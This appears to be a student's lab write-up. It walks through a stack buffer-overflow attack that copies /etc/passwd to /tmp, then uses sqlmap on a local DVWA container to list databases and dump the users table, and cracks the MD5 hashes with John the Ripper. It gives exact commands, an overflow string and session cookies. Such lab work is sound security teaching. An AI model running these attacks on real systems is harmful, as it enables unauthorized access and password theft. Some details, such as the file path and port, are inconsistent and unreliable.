```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  
**Answer 1**: Must conform to below structure:

## 1.Create a Vulnerable C Program

```bash
nano redundant_code.c
```
![image](https://github.com/user-attachments/assets/2e434b7b-7ddf-4675-8e55-54fbc71d3579)

Create a C program that contains a buffer overflow vulnerability

## 2.  Compile the C Program

```bash
gcc -o redundant_code redundant_code.c -fno-stack-protector -z execstack
```
Run by gcc
- -fno-stack-protector: Disables stack protection.
- -z execstack: Marks the stack as executabl

## 3. Create the Assembly Payload

* Now, create an assembly program that will copy /etc/passwd to /tmp/pwfile. Hereâ€™s the assembly code

```bash
nano asm_code.asm
```
![image](https://github.com/user-attachments/assets/d431ef63-ede5-4b1c-ad05-3e1ba676f77f)

## 4. Compile the Assembly Code 

* Save the assembly code in a file named asm_code.asm, and then assemble and link it:

```bash
nasm -f elf32 -o asm_code.o asm_code.asm
ld -m elf_i386 -o asm_code asm_code.o
```

## 5. Load redundant_code  to gdb

```bash
gdb ./redundant_code
```
You need to find the address of the `redundant_code` binary in memory. This address will be used in the exploit string to redirect execution to the payload. To do this, you can use a debugger like `gdb`:
## 6. Finding the Address of the Payload


```bash
break redundant_code
run $(python -c "print('A'*72)")
p &buffer
```

![image](https://github.com/user-attachments/assets/1c2622c2-8880-49e1-8d64-32e16e20a848)


Inside `gdb`, set a breakpoint in the `redundant_code`, run the program with a dummy argument, and find the address of your payload. This will typically be after the buffer size.

Make a note of the address is `0xf7fcc5b4`; you'll use it in the next step.

## 7. Execute the Vulnerable Program with the Payload

Run the vulnerable program with the crafted payload:

```bash
./redundant_code "$(python -c "print('a'*72 + '\xb4\xc5\xfc\xf7')")"
```

Generated a string of 72 'a' characters followed by a byte sequence intended to manipulate the program's execution flow. The output resulted in a "Segmentation fault (core dumped)," confirming the presence of a buffer overflow vulnerability in the redundant_code program.

## 8. Verify the Output

```bash
cat /etc/passwd
```

![image](https://github.com/user-attachments/assets/ef6984a4-6a33-45d3-80b7-aae79745d59f)


The command cat /etc/passwd is useful for viewing user account information on a Linux or Unix system.  

```bash
cat /tmp/outfile
```


![image](https://github.com/user-attachments/assets/56fa25ea-0a95-44ba-a009-1a78bd406e6a)

 The /etc/passwd file is copied to /tmp/outfile.



`Conclusion `: In this exercise, I successfully demonstrated how exploiting vulnerabilities in a C program using a Code Injection or Environment Variable attack can lead to unauthorized actions, such as copying the /etc/passwd file to /tmp/pwfile. This highlights the critical importance of secure coding practices, input validation, and system-level protections like ASLR and stack canaries. Proper permissions and security measures are essential to prevent such attacks and protect sensitive data.


# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
```
![image](https://github.com/user-attachments/assets/54f77e65-1050-4959-aac1-4685fc0c55b7)



2. Access DVWA

Open a web browser and go to: http://localhost
Log in with the default credentials:

Username: admin

Password: password

![image](https://github.com/user-attachments/assets/621fccaa-4c6a-4af0-80c0-679b52944d1b)

This is page Login to DVWA

![image](https://github.com/user-attachments/assets/0a765301-2d1b-44b7-a8ef-5b020f4ce2d9)

This home page to set up database

3. Install SQLMap in WSL

```bash
wsl
sudo apt install sqlmap
```

4. Fetch the url of webiste you want to attack

![image](https://github.com/user-attachments/assets/7990b9c9-d27f-4129-be3f-03c756477149)


Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli/?id=1`

5. Get information about all available databases


![image](https://github.com/user-attachments/assets/50a4a548-b017-4cf1-9a9c-c3cde8af9d2d)

Get cookie value of website: PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3

- -u: This option specifies the target URL that sqlmap will test for SQL injection vulnerabilities.

- --cookie: This option allows you to provide specific cookies that should be sent along with the request. 

- --data: This option is used to send data in a POST request.
- --dbs:This option tells sqlmap to enumerate the databases on the server if an SQL injection vulnerability is detected. It attempts to retrieve a list of all databases present in the database management system.

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --dbs
```

![image](https://github.com/user-attachments/assets/0a9fd479-4d89-43ba-9f3a-56db673d3400)

Return 2 available databases named : dvwa and information_schema


**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

## 1. Choice Database is dvwa and Use sqlmap to get table 

-D: This option specifies the database name that sqlmap should target.
--tables:
This option tells sqlmap to enumerate the tables within the specified database (in this case, dvwa). If the dvwa database is found and accessible, sqlmap will retrieve and display a list of its tables.


```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa --tables
```



![image](https://github.com/user-attachments/assets/13a09125-e859-4705-8e9c-50f30622f3be)

Return 2 tables named : guestbook and users

## 2. Choice Database is Users and  use sqlmap to get  users information


-T: Specifies the target table to operate on.
--dump:
This option tells sqlmap to extract and display the contents of the specified table (users). It retrieves all rows and columns from the users table

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump
```

![image](https://github.com/user-attachments/assets/70f0eef2-adaa-4242-b3d2-279322f1da2b)


Retrun all columns and all row of table named users


**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:

## 1. Dowload John the Ripper


```bash
sudo apt-get install john
```
![image](https://github.com/user-attachments/assets/65108fed-599b-41b1-8439-885bfa231c6d)

or on windown download from `https://download.openwall.net/pub/projects/john/contrib/windows/` 


Download successfully

## 2. Make format to use John the Ripper 

![image](https://github.com/user-attachments/assets/96d9bbab-0846-497c-9ff4-fd688a34939b)


## 3. You can see the password has been hashed next to it

--format: Specifies the type of hashing algorithm used. John the Ripper supports various formats, including raw-md5, sha256, bcrypt, and more. Specifying the correct format is essential for accurate cracking.

```hash
.\john.exe --format=raw-md5 C:\Users\ASUS\Downloads\hash.txt
```

`Conclusion`: In this exercise, I demonstrated the process of exploiting SQL injection vulnerabilities in DVWA using SQLMap to gather database information, including tables and user details. Following this, I utilized John the Ripper to crack the database users' passwords. This practical approach emphasizes the need for secure coding, proper database configuration, and the importance of securing web applications against SQL injection attacks to protect sensitive information from being compromised.
